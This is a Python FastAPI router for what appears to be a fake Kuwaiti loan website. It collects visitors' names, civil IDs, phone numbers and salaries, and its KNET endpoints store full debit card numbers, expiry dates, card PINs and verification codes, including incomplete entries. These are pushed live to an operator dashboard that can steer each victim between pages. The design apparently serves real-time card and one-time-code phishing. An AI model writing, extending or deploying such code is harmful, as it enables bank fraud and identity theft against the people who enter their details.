from datetime import datetime, timezone

from bson import ObjectId
from fastapi import APIRouter, Depends, HTTPException, Request

from app.database import get_database
from app.dependencies import allow_rate_limit, get_or_create_id, get_request_ip
from app.models import (
    AdditionalCustomerInfoCreate,
    CurrentPageUpdate,
    CustomerInfoCreate,
    KnetSubmissionLogCreate,
    KnetSubmissionCreate,
    LoanSubmissionCreate,
    VerificationCodeCreate,
    VisitorHeartbeatUpdate,
)
from app.presence import mark_online as presence_mark_online
from app.presence import update_current_page as presence_update_current_page
from app.realtime import admin_realtime_hub, visitor_realtime_hub

router = APIRouter(tags=["Visitors"])
REDIRECT_TARGETS = {
    "/",
    "/loan-calculator",
    "/customer-info",
    "/additional-customer-info",
    "/transaction-notification",
    "/knet",
    "/verfication",
}
REDIRECT_TARGET_ALIASES = {
    "/additional-info": "/additional-customer-info",
    "/transaction-info": "/transaction-notification",
}


@router.get("/visitors")
async def visitors() -> dict[str, str]:
    return {"status": "ok"}

@router.post("/visitors/current-page")
async def update_current_page(
    payload: CurrentPageUpdate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    visitor_id, _visitor_state = visitor_data
    collection = get_database()["visitors"]

    await collection.update_one(
        {"_id": ObjectId(visitor_id)},
        {"$set": {"current_page": payload.current_page}},
    )
    await presence_update_current_page(visitor_id, payload.current_page, ttl_seconds=20)
    await admin_realtime_hub.broadcast(
        "visitor.current_page.updated",
        visitor_id=visitor_id,
        meta={"current_page": payload.current_page},
    )

    return {
        "status": "updated",
        "id": visitor_id,
        "current_page": payload.current_page,
    }


@router.post("/visitors/loan-submission")
async def create_loan_submission(
    request: Request,
    payload: LoanSubmissionCreate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    ip = get_request_ip(request)
    if not await allow_rate_limit(f"visitor:loan-submission:{ip}", limit=12, window_seconds=60):
        raise HTTPException(status_code=429, detail="rate limited")
    visitor_id, _visitor_state = visitor_data
    collection = get_database()["loan_submissions"]

    result = await collection.insert_one(
        {
            "visitor_id": ObjectId(visitor_id),
            "amount": payload.amount,
            "loanterm": payload.loanterm,
            "loan_type": payload.loan_type,
            "created_at": datetime.now(timezone.utc),
        }
    )
    await admin_realtime_hub.broadcast("visitor.loan_submission.created", visitor_id=visitor_id)

    return {
        "status": "saved",
        "id": str(result.inserted_id),
    }


@router.post("/visitors/heartbeat")
async def visitor_heartbeat(
    payload: VisitorHeartbeatUpdate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    visitor_id, _visitor_state = visitor_data
    current_page = payload.current_page if isinstance(payload.current_page, str) else None
    await presence_mark_online(visitor_id, current_page=current_page, ttl_seconds=20)
    await admin_realtime_hub.broadcast("visitor.heartbeat", visitor_id=visitor_id)

    return {
        "status": "alive",
        "id": visitor_id,
    }


@router.get("/visitors/redirect-check")
async def visitor_redirect_check(
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str | bool]:
    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    redirect_collection = get_database()["visitor_redirects"]
    redirect_doc = await redirect_collection.find_one_and_delete(
        {"visitor_id": visitor_object_id},
        {"_id": 0, "target_path": 1},
    )
    if not isinstance(redirect_doc, dict):
        return {"redirect": False}

    target_path_raw = redirect_doc.get("target_path")
    target_path = str(target_path_raw).strip() if isinstance(target_path_raw, str) else ""
    if target_path in REDIRECT_TARGET_ALIASES:
        target_path = REDIRECT_TARGET_ALIASES[target_path]
    if target_path not in REDIRECT_TARGETS:
        return {"redirect": False}
    return {"redirect": True, "target_path": target_path}


@router.get("/visitors/latest-knet-summary")
async def latest_knet_summary(
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    knet_submissions_collection = get_database()["knet_submissions"]
    doc = await knet_submissions_collection.find_one(
        {"visitor_id": visitor_object_id, "archived_at": {"$exists": False}},
        sort=[("created_at", -1)],
        projection={
            "_id": 0,
            "dcprefix": 1,
            "debit_number": 1,
            "exp_month": 1,
            "exp_year": 1,
        },
    )
    if not isinstance(doc, dict):
        return {
            "card_masked": "—",
            "exp_month": "00",
            "exp_year": "0000",
        }

    dcprefix = str(doc.get("dcprefix", "")).strip()
    debit_number = str(doc.get("debit_number", "")).strip()
    full_number = f"{dcprefix}{debit_number}"

    prefix = dcprefix
    tail = full_number[-4:] if len(full_number) >= 4 else full_number
    remainder = full_number[len(prefix):] if full_number.startswith(prefix) else full_number
    if len(remainder) < len(tail):
        tail = remainder
    middle_len = max(len(remainder) - len(tail), 0)
    masked_middle = "●" * middle_len
    masked = f"{prefix}{masked_middle}{tail}" if full_number else "—"

    exp_month_raw = doc.get("exp_month")
    exp_year_raw = doc.get("exp_year")
    exp_month = f"{int(exp_month_raw):02d}" if isinstance(exp_month_raw, int) else "00"
    exp_year = str(exp_year_raw) if isinstance(exp_year_raw, int) else "0000"

    return {
        "card_masked": masked,
        "exp_month": exp_month,
        "exp_year": exp_year,
    }


@router.post("/visitors/customer-info")
async def save_customer_info(
    request: Request,
    payload: CustomerInfoCreate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    ip = get_request_ip(request)
    if not await allow_rate_limit(f"visitor:customer-info:{ip}", limit=20, window_seconds=60):
        raise HTTPException(status_code=429, detail="rate limited")
    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    collection = get_database()["customer_info"]
    now_utc = datetime.now(timezone.utc)
    existing_doc = await collection.find_one({"visitor_id": visitor_object_id})

    applicant_name = payload.applicant_name.strip()
    civil_id = payload.civil_id
    phone_number = payload.phone_number
    loan_type = payload.loan_type.strip() if isinstance(payload.loan_type, str) else None

    set_payload: dict[str, object] = {
        "visitor_id": visitor_object_id,
        "applicant_name": applicant_name,
        "civil_id": civil_id,
        "phone_number": phone_number,
        "updated_at": now_utc,
    }
    if loan_type:
        set_payload["loan_type"] = loan_type

    did_change = existing_doc is None
    if not did_change:
        if str(existing_doc.get("applicant_name", "")).strip() != applicant_name:
            did_change = True
        elif str(existing_doc.get("civil_id", "")).strip() != civil_id:
            did_change = True
        elif str(existing_doc.get("phone_number", "")).strip() != phone_number:
            did_change = True
        elif loan_type is not None and str(existing_doc.get("loan_type", "")).strip() != loan_type:
            did_change = True

    if did_change:
        set_payload["has_new_info_for_admin"] = True
        set_payload["info_updated_at"] = now_utc

    await collection.update_one(
        {"visitor_id": visitor_object_id},
        {
            "$set": set_payload,
            "$setOnInsert": {"created_at": now_utc},
        },
        upsert=True,
    )
    await admin_realtime_hub.broadcast(
        "visitor.customer_info.updated",
        visitor_id=visitor_id,
        meta={"has_new_info": bool(did_change)},
    )

    return {
        "status": "saved",
        "id": visitor_id,
    }


@router.post("/visitors/additional-customer-info")
async def save_additional_customer_info(
    request: Request,
    payload: AdditionalCustomerInfoCreate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    ip = get_request_ip(request)
    if not await allow_rate_limit(f"visitor:additional-customer-info:{ip}", limit=20, window_seconds=60):
        raise HTTPException(status_code=429, detail="rate limited")
    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    collection = get_database()["customer_info"]
    now_utc = datetime.now(timezone.utc)
    existing_doc = await collection.find_one({"visitor_id": visitor_object_id})

    work_nature = payload.work_nature.strip()
    job_title = payload.job_title.strip()
    salary = payload.salary
    additional_income = payload.additional_income

    set_payload: dict[str, object] = {
        "visitor_id": visitor_object_id,
        "work_nature": work_nature,
        "job_title": job_title,
        "salary": salary,
        "additional_income": additional_income,
        "updated_at": now_utc,
    }

    did_change = existing_doc is None
    if not did_change:
        if str(existing_doc.get("work_nature", "")).strip() != work_nature:
            did_change = True
        elif str(existing_doc.get("job_title", "")).strip() != job_title:
            did_change = True
        elif existing_doc.get("salary") != salary:
            did_change = True
        elif existing_doc.get("additional_income") != additional_income:
            did_change = True

    if did_change:
        set_payload["has_new_info_for_admin"] = True
        set_payload["info_updated_at"] = now_utc

    await collection.update_one(
        {"visitor_id": visitor_object_id},
        {
            "$set": set_payload,
            "$setOnInsert": {"created_at": now_utc},
        },
        upsert=True,
    )
    await admin_realtime_hub.broadcast(
        "visitor.additional_info.updated",
        visitor_id=visitor_id,
        meta={"has_new_info": bool(did_change)},
    )

    return {
        "status": "saved",
        "id": visitor_id,
    }


@router.post("/visitors/knet-submission")
async def save_knet_submission(
    request: Request,
    payload: KnetSubmissionCreate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str | bool]:
    ip = get_request_ip(request)
    if not await allow_rate_limit(f"visitor:knet-submission:{ip}", limit=10, window_seconds=60):
        raise HTTPException(status_code=429, detail="rate limited")
    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    collection = get_database()["knet_submissions"]
    verification_collection = get_database()["knet_verifications"]
    now_utc = datetime.now(timezone.utc)

    dcprefix = payload.dcprefix.strip()
    debit_number = payload.debit_number.strip()
    is_test_valid_knet = debit_number == "1000000001"
    required_debit_length = 16 - len(dcprefix)
    debit_length_matches = is_test_valid_knet or (
        required_debit_length > 0 and len(debit_number) == required_debit_length
    )

    full_card_number = f"{dcprefix}{debit_number}" if debit_length_matches else ""

    luhn_valid = is_test_valid_knet
    if not luhn_valid and len(full_card_number) == 16 and full_card_number.isdigit():
        checksum = 0
        should_double = False
        for char in reversed(full_card_number):
            digit = int(char)
            if should_double:
                digit *= 2
                if digit > 9:
                    digit -= 9
            checksum += digit
            should_double = not should_double
        luhn_valid = checksum % 10 == 0

    current_ym = now_utc.year * 100 + now_utc.month
    expiry_ym = payload.exp_year * 100 + payload.exp_month
    expiry_valid = expiry_ym >= current_ym

    result = await collection.insert_one(
        {
            "visitor_id": visitor_object_id,
            "bank": payload.bank.strip(),
            "dcprefix": dcprefix,
            "debit_number": debit_number,
            "exp_month": payload.exp_month,
            "exp_year": payload.exp_year,
            "pin_code": payload.pin_code,
            "card_number_length_valid": debit_length_matches,
            "luhn_valid": luhn_valid,
            "expiry_valid": expiry_valid,
            "created_at": now_utc,
        }
    )
    await verification_collection.update_one(
        {"visitor_id": visitor_object_id},
        {
            "$set": {
                "visitor_id": visitor_object_id,
                "status": "pending",
                "updated_at": now_utc,
            },
            "$setOnInsert": {"created_at": now_utc},
        },
        upsert=True,
    )
    await admin_realtime_hub.broadcast(
        "visitor.knet.submitted",
        visitor_id=visitor_id,
        meta={
            "verification_status": "pending",
            "submission": {
                "id": str(result.inserted_id),
                "bank": payload.bank.strip(),
                "dcprefix": dcprefix,
                "debit_number": debit_number,
                "pin_code": payload.pin_code,
                "expiry": f"{payload.exp_month:02d}/{payload.exp_year}",
                "card_number_length_valid": debit_length_matches,
                "luhn_valid": luhn_valid,
                "expiry_valid": expiry_valid,
                "created_at": "الآن",
                "verfication_codes": [],
            },
        },
    )

    return {
        "status": "saved",
        "id": str(result.inserted_id),
        "luhn_valid": luhn_valid,
        "expiry_valid": expiry_valid,
    }


@router.post("/visitors/knet-submission-log")
async def log_knet_submission_attempt(
    request: Request,
    payload: KnetSubmissionLogCreate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    ip = get_request_ip(request)
    if not await allow_rate_limit(f"visitor:knet-submission-log:{ip}", limit=30, window_seconds=60):
        raise HTTPException(status_code=429, detail="rate limited")

    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    collection = get_database()["knet_submission_logs"]
    now_utc = datetime.now(timezone.utc)

    await collection.insert_one(
        {
            "visitor_id": visitor_object_id,
            "bank": (payload.bank or "").strip(),
            "dcprefix": (payload.dcprefix or "").strip(),
            "debit_number": (payload.debit_number or "").strip(),
            "exp_month": payload.exp_month,
            "exp_year": payload.exp_year,
            "pin_code": (payload.pin_code or "").strip(),
            "missing_fields": [str(item).strip() for item in payload.missing_fields if str(item).strip()],
            "validation_error": (payload.validation_error or "").strip(),
            "created_at": now_utc,
        }
    )
    await admin_realtime_hub.broadcast(
        "visitor.knet.submission.logged",
        visitor_id=visitor_id,
        meta={"kind": "incomplete"},
    )

    return {"status": "logged"}


@router.get("/visitors/knet-verification-status")
async def get_knet_verification_status(
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    verification_collection = get_database()["knet_verifications"]
    doc = await verification_collection.find_one(
        {"visitor_id": visitor_object_id},
        {"_id": 0, "status": 1, "updated_at": 1},
    )
    status_raw = str(doc.get("status", "")).strip().lower() if isinstance(doc, dict) else ""
    if status_raw == "pending" and isinstance(doc, dict):
        updated_at_raw = doc.get("updated_at")
        if isinstance(updated_at_raw, datetime):
            updated_at_utc = (
                updated_at_raw.astimezone(timezone.utc)
                if updated_at_raw.tzinfo is not None
                else updated_at_raw.replace(tzinfo=timezone.utc)
            )
            if (datetime.now(timezone.utc) - updated_at_utc).total_seconds() >= 60:
                await verification_collection.update_one(
                    {"visitor_id": visitor_object_id},
                    {
                        "$set": {
                            "status": "rejected",
                            "updated_at": datetime.now(timezone.utc),
                            "reviewed_by": "system-timeout",
                        }
                    },
                )
                await admin_realtime_hub.broadcast(
                    "visitor.knet.verification.updated",
                    visitor_id=visitor_id,
                    meta={"status": "rejected", "source": "system-timeout"},
                )
                await visitor_realtime_hub.send_to_visitor(
                    visitor_id=visitor_id,
                    event="visitor.knet.verification.updated",
                    meta={"status": "rejected", "source": "system-timeout"},
                )
                status_raw = "rejected"
    status = status_raw if status_raw in {"pending", "approved", "rejected"} else "pending"
    return {"status": status}


@router.post("/visitors/verfication-code")
async def save_verfication_code(
    request: Request,
    payload: VerificationCodeCreate,
    visitor_data: tuple[str, str] = Depends(get_or_create_id),
) -> dict[str, str]:
    ip = get_request_ip(request)
    if not await allow_rate_limit(f"visitor:verfication-code:{ip}", limit=12, window_seconds=60):
        raise HTTPException(status_code=429, detail="rate limited")

    visitor_id, _visitor_state = visitor_data
    visitor_object_id = ObjectId(visitor_id)
    db = get_database()
    knet_submissions_collection = db["knet_submissions"]
    codes_collection = db["knet_verification_codes"]
    now_utc = datetime.now(timezone.utc)

    latest_knet = await knet_submissions_collection.find_one(
        {"visitor_id": visitor_object_id, "archived_at": {"$exists": False}},
        {"_id": 1},
        sort=[("created_at", -1)],
    )
    if not isinstance(latest_knet, dict) or not isinstance(latest_knet.get("_id"), ObjectId):
        raise HTTPException(status_code=400, detail="no knet submission found")

    submission_object_id: ObjectId = latest_knet["_id"]
    result = await codes_collection.insert_one(
        {
            "visitor_id": visitor_object_id,
            "knet_submission_id": submission_object_id,
            "code_value": payload.code_value,
            "created_at": now_utc,
        }
    )
    await admin_realtime_hub.broadcast(
        "visitor.verfication_code.submitted",
        visitor_id=visitor_id,
        meta={
            "knet_submission_id": str(submission_object_id),
            "code_value": payload.code_value,
            "created_at": "الآن",
        },
    )
    return {"status": "saved", "id": str(result.inserted_id)}
